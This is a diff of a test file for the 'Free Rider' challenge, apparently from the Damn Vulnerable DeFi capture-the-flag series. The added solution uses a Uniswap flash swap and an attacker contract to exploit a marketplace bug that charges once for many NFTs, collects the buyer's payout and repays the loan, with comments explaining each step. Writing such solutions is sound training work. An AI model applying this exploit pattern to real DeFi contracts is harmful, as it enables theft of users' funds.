@@ -104,7 +104,25 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //This challenge requires an attacker contract to perform all step-by-step operations in one transaction. 
+        //To get free ETH for an instant, as we are suggested, we must perform a flash swap to Uniswap WETH/DVT pair contract.
+        //The attacker contract implements both the function to trigger it and to re-pay back to Uniswap pair via IUniswapV2Callee. 
+        //Marketplace has a fault that allows us to buy all NFTs just paying the price of one. 
+        //We are also getting refunded after becoming owner of the token, so marketplace funds are being sent to us in consecutive buyOne calls,
+        //as msg.value will still be valid to overcome the requirement. 
+        //Calling buyMany with the correct msg.value will do the work. We must implement IERC721Receiver to 
+        //successfully receive all ERC721 tokens. Afterwards, we can forward all of them to buyer, get the payout and repay UniswapV2 pair contract.  
+        //The attacker contract describes all steps and needed calls with console.logs to make them more visual. 
+        
+        console.log("Attacker initial ETH balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)))
+        const attackerContractFactory = await ethers.getContractFactory("FreeRiderAttacker",attacker);
+        const attackerContract = await attackerContractFactory.deploy(this.buyerContract.address, this.marketplace.address, this.nft.address, this.uniswapPair.address, attacker.address); 
+        console.log("Attacker contract deployed! I'll execute flash swap for 20 WETH")
+
+        await attackerContract.flashSwap(this.weth.address, ethers.utils.parseEther("20"))
+        console.log("Attacker contract ETH balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attackerContract.address)))
+        console.log("Attacker final ETH balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)))
+
     });
 
     after(async function () {
